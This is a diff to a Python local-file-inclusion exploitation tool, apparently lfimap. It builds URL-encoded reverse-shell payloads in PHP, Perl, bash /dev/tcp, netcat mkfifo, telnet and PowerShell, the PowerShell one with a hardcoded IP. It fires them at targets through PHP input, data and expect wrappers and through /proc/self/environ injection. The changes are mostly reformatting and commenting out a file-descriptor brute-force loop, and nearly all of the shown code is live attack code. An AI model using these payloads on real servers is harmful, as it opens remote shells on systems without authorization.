@@ -352,11 +352,19 @@ def exploit(exploits, method):
         port = args.lport
         
         phpPayload = "php+-r+'$sock%3dfsockopen(\"{0}\",{1})%3bexec(\"/bin/sh+-i+<%263+>%263+2>%263\")%3b'".format(ip, str(port))
-        perlPayload = "perl+-e+'use+Socket%3b$i%3d\"" + ip + "\"%3b$p%3d"+str(port)+"%3bsocket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"))%3bif(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">%26S\")%3bopen(STDOUT,\">%26S\")%3bopen(STDERR,\">%26S\")%3bexec(\"/bin/sh+-i\")%3b}%3b'"
+        perlPayload = "perl+-e+'use+Socket%3b$i%3d\"" + ip + "\"%3b$p%3d"+str(port)+"%3bsocket(S,PF_INET,SOCK_STREAM,getprotobyname"\
+                      "(\"tcp\"))%3bif(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">%26S\")%3bopen(STDOUT,\">%26S\")%3bopen"\
+                      "(STDERR,\">%26S\")%3bexec(\"/bin/sh+-i\")%3b}%3b'"
+        
         bashPayload = "echo+'bash+-i+>%26+/dev/tcp/"+ip+"/"+str(port)+"+0>%261'>/tmp/1.sh"
         ncPayload = "rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+" +ip+'+'+str(port)+"+>/tmp/f"
         telnetPayload = "rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|telnet+{0}+{1}+>/tmp/f".format(ip, port)
-        powershellPayload = "powershell+-nop+-c+\"$client+%3d+New-Object+System.Net.Sockets.TCPClient('192.168.80.129',99)%3b$stream+%3d+$client.GetStream()%3b[byte[]]$bytes+%3d+0..65535|%25{0}%3bwhile(($i+%3d+$stream.Read($bytes,+0,+$bytes.Length))+-ne+0){%3b$data+%3d+(New-Object+-TypeName+System.Text.ASCIIEncoding).GetString($bytes,0,+$i)%3b$sendback+%3d+(iex+$data+2>%261+|+Out-String+)%3b$sendback2+%3d+$sendback+%2b+'PS+'+%2b+(pwd).Path+%2b+'>+'%3b$sendbyte+%3d+([text.encoding]%3a%3aASCII).GetBytes($sendback2)%3b$stream.Write($sendbyte,0,$sendbyte.Length)%3b$stream.Flush()}%3b$client.Close()\""
+        
+        powershellPayload = "powershell+-nop+-c+\"$client+%3d+New-Object+System.Net.Sockets.TCPClient('192.168.80.129',99)%3b$stream+%3d+$client."\
+                            "GetStream()%3b[byte[]]$bytes+%3d+0..65535|%25{0}%3bwhile(($i+%3d+$stream.Read($bytes,+0,+$bytes.Length))+-ne+0){%3b$data"\
+                            "+%3d+(New-Object+-TypeName+System.Text.ASCIIEncoding).GetString($bytes,0,+$i)%3b$sendback+%3d+(iex+$data+2>%261+|+Out-String+)%3b$"\
+                            "sendback2+%3d+$sendback+%2b+'PS+'+%2b+(pwd).Path+%2b+'>+'%3b$sendbyte+%3d+([text.encoding]%3a%3aASCII).GetBytes($sendback2)%3b$stream"\
+                            ".Write($sendbyte,0,$sendbyte.Length)%3b$stream.Flush()}%3b$client.Close()\""
 
         if(exploit['ATTACK_METHOD'] == method and method == 'INPUT'):
             
@@ -381,7 +389,7 @@ def exploit(exploits, method):
                 if('/bin' in res.text and '/nc' in res.text):
                     u = url.replace('TMP', ncPayload)
                     printInfo(ip, port, 'nc', 'input wrapper')
-                    res = requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
+                    requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
                     return
 
                 #PHP
@@ -407,7 +415,7 @@ def exploit(exploits, method):
                 if('/bin' in res.text and '/telnet' in res.text):
                     u = url.replace('TMP', telnetPayload)
                     printInfo(ip, port, 'telnet', 'input wrapper')
-                    res = requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
+                    requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
                     return
             
 
@@ -432,7 +440,7 @@ def exploit(exploits, method):
                 if('lfimap-nc.exe' in res.text):
                     u = url.replace('TMP', "nc+-e+cmd.exe+{0}+{1}".format(ip, port))
                     printInfo(ip, port, 'nc', 'input wrapper')
-                    res = requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
+                    requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
                     return
                 
 
@@ -458,7 +466,7 @@ def exploit(exploits, method):
                 if('/bin' in res.text and '/nc' in res.text):
                     printInfo(ip, port, 'nc', 'data wrapper')
                     u = url.replace('TMP', ncPayload)
-                    res = requests.get(u, headers = headers, proxies = proxies)
+                    requests.get(u, headers = headers, proxies = proxies)
                     return
                 
                 #PHP
@@ -506,7 +514,7 @@ def exploit(exploits, method):
                 if('nc.exe' in res.text):
                     u = url.replace('TMP', "nc+-e+cmd.exe+{0}+{1}".format(ip, port))
                     printInfo(ip, port, 'nc', 'data wrapper')
-                    res = requests.get(u, headers = headers, proxies = proxies)
+                    requests.get(u, headers = headers, proxies = proxies)
                     return
                 
 
@@ -531,7 +539,7 @@ def exploit(exploits, method):
                 if('/bin' in res.text and '/nc' in res.text):
                     u = url.replace('TMP', ncPayload)
                     printInfo(ip, port, 'nc', 'expect wrapper')
-                    res = requests.get(u, headers = headers, proxies = proxies)
+                    requests.get(u, headers = headers, proxies = proxies)
                     return
                
                 #PHP
@@ -578,7 +586,7 @@ def exploit(exploits, method):
                 if('nc.exe' in res.text):
                     u = url.replace('TMP', "nc+-e+cmd.exe+{0}+{1}".format(ip, port))
                     printInfo(ip, port, 'nc', 'expect wrapper')
-                    res = request.get(u, headers = headers, proxies = proxies)
+                    request.get(u, headers = headers, proxies = proxies)
                     return
 
 
@@ -598,17 +606,21 @@ def exploit(exploits, method):
                 if(args.verbose):
                     print("[i] Trying to send reverse shell using /proc/self/environ LFI ...")
                 
-                #Exploit
-                u = url.replace('TMP', "/proc/self/environ&cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+" +ip+'+'+str(port)+"+>/tmp/f")
-                res = requests.get(u, headers = tempHeaders, proxies = proxies)
+                #Exploit /proc/self/environ injection
+                #Bash rev. shell
+                u = url.replace('TMP', "/proc/self/environ&cmd={0}".format(bashPayload))
+                requests.get(u, headers = tempHeaders, proxies = proxies)
+                u = url.replace('TMP', "/proc/self/environ&cmd='bash+/tmp/1.sh'")
+                requests.get(u, headers = tempHeaders, proxies = proxies)
+
                 
-                #/proc/self/fd/ LFI to rev shell
-                if(args.verbose):
-                   print("[i] Bruteforcing /proc/self/fd descriptors ...")
-               
-                for i in range(15):
-                    u = url.replace('TMP', "/proc/self/fd/{0}".format(i) + "?cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+" +ip+'+'+str(port)+"+>/tmp/f")
-                    requests.get(u, headers = tempHeaders, proxies = proxies)
+               # #/proc/self/fd/ LFI to rev shell
+               # if(args.verbose):
+               #    print("[i] Bruteforcing /proc/self/fd descriptors ...")
+               # 
+               #  for i in range(15):
+               #      u = url.replace('TMP', "/proc/self/fd/{0}".format(i) + "?cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+" +ip+'+'+str(port)+"+>/tmp/f")
+               #     irequests.get(u, headers = tempHeaders, proxies = proxies)
         
         elif(exploit['ATTACK_METHOD'] == method and method == 'RFI'):
             #url = exploit['GETVAL']
